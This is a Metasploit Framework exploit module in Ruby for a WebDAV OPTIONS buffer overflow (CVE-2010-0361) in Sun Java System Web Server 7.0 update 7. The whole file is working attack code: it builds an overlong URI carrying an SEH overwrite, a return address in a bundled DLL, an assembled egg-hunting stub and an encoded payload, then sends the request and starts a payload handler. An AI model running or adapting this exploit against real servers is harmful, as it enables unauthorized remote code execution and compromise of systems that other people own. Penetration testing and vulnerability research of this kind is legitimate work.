##
# $Id: sun_jsws_dav_options.rb 9202 2010-05-02 21:04:56Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/exploit/http'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Java System Web Server WebDAV OPTIONS Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Sun Java Web Server prior to
				version 7 Update 8. By sending an "OPTIONS" request with an overly long
				path, attackers can execute arbitrary code. In order to reach the vulnerable
				code, the attacker must also specify the path to a directory with WebDAV
				enabled.

				This exploit was tested and confirmed to work on Windows XP SP3 without DEP.
				Versions for other platforms are vulnerable as well.

				The vulnerability was originally discovered and disclosed by Evgeny Legerov of
				Intevydis.
			},
			'Author'         => 'jduck',
			'Version'        => '$Revision: 9202 $',
			'References'     =>
				[
					[ 'CVE', '2010-0361' ],
					[ 'OSVDB', '61851' ],
					[ 'URL', 'http://intevydis.blogspot.com/2010/01/sun-java-system-web-server-70u7-webdav.html' ],
					[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-66-275850-1' ]
				],
			'Platform'       => [ 'win' ], #, 'linux', 'solaris', 'win' ],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2000,
					# ugh.. crazy!
					'BadChars' => ((0..8).to_a + (0xa..0x1f).to_a + [0x7f]).pack('C*'),
					'DisableNops' => true,
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						}
				},
			'Targets'        =>
				[
					# No automatic target atm...
					#[ 'Automatic', { } ],

					[ 'Sun Java System Web Server 7.0 update 7 on Windows x86 (SEH)',
						{
							'Platform' => 'win',
							'Arch'     => ARCH_X86,
							'Offset'   => 760,
							'Ret'      => 0x12012177 # p/p/r in xerces-C_2_6.dll
						},
					],

=begin
					[ 'Sun Java System Web Server 7.0 update 7 on Windows x86 (saved ret)',
						{
							'Platform' => 'win',
							'Arch'     => ARCH_X86,
							'Offset'   => 184,
							'Ret'      => 0xdeadbeef
						},
					],

					[ 'Sun Java System Web Server 7.0 update 7 on Linux x86',
						{
							'Platform' => 'linux',
							'Arch'     => ARCH_X86,
							'Offset'   => 224,
							# @ 220 - 0x09703e90
							'Ret'      => 0xdeadbeef
						},
					],

					[ 'Sun Java System Web Server 7.0 update 7 on Windows x86',
						{
							'Platform' => 'solaris',
							'Arch'     => ARCH_SPARC,
							'Offset'   => 3133,
							'Ret'      => 0xdeadbeef
						},
					],
=end

					#
					# You can use this in order to devise other targets..
					#
					[ 'Debug Target', { } ]
				],
			'DisclosureDate' => 'Jan 20 2010',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('PATH', [ true,  "The URI path of a WebDAV collection on the server", '/webdav'])
			], self.class)

	end

	def check

		res = send_request_raw({
			'method'  => 'OPTIONS',
			'proto'   => 'HTTP',
			'version' => '1.0',
			'uri'     => datastore['PATH']
		}, 5)

		if res and res['Server']
			print_status("Found server: #{res['Server']}")
			return Exploit::CheckCode::Detected
		end

		Exploit::CheckCode::Safe

	end

	def exploit

		#
		# various crashes from linux sjsws 7u7:
		#
		# 216 - 0xb5a7a384 <DACL_isMatchingSelf@plt+256>:       jmp    *0x268(%ebx), ebx: 0x41386741
		# 220 - 0xb5a80000 <_ZN16DAVVirtualServerD1Ev+148>:     add    %ah,0x84d8bff(%edi,%edi,8), edi: 0x31684130
		# 224 - 0x68413368 in ?? ()
		# 244 - 0xb5a80ba4 <DACL_GetDACLListForUri+164>:        movl   $0xffffffff,(%eax), eax: 0x41306941
		# 248 - 0xb5a836e7 <DACL_ReadDACLFile+79>:      movl   $0x0,(%edx), edx: 0x69413169
		#
		# on windows sjsws 7u7:
		#
		# 200 - 67413167 ??              ???
		# 2000 - smashes SEH, hits end of stack, 357a4134
		#

		uri = ''
		uri << datastore['PATH']
		uri << '/' if uri[-1,1] != '/'

		# Just crash it nicely...
		if (target.name =~ /Debug Target/)
			uri << Rex::Text.pattern_create(2000)
			encoded = "\xcc"
			encoded << "A" * (payload_space - 2)
			encoded << "\xcc"

			#sled = Rex::Text.charset_exclude(payload_badchars)
			#encoded[32,sled.length] = sled

		elsif (target.name =~ /\(SEH\)/)
			off = target['Offset']
			rest = ''
			rest << rand_text_alphanumeric(off)

			seh = generate_seh_record(target.ret)
			stub = "
				sub esp, -0x1a0
				pop ecx
				pop ecx
				sub ecx, 0x3c
			still:
				mov al, [ecx]
				cmp al, 0x41
				jne nope
				inc ecx
				jmp still
			nope:
				jmp ecx
			"
			seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, stub).encode_string

			rest << Rex::Text.to_hex(seh, '%')
			rest << "A" * 256
			rest << payload.encoded
			rest << rand_text_alphanumeric(2200 - rest.length)
			uri << rest

			encoded = rand_text_alphanumeric(32+rand(64))

			# From CORE local PoC
			#uri = '/' + ("D"*2000) + '/..' + datastore['PATH'] + '/' + rest
		end

		# NOTE: We could use this to avoid badchars, but it ends up putting a url encoded version
		# of the payload in memory, not exactly what we want :-/
		#encoded = Rex::Text.to_hex(pl, '%')

		res = send_request_raw({
			'method'  => 'OPTIONS',
			'proto'   => 'HTTP',
			'version' => '1.0',
			'headers' =>
				{
					'Referrer' => encoded,
					'User-Agent' => encoded
				},
			'uri'     => uri
		}, 5)

		handler
	end

end

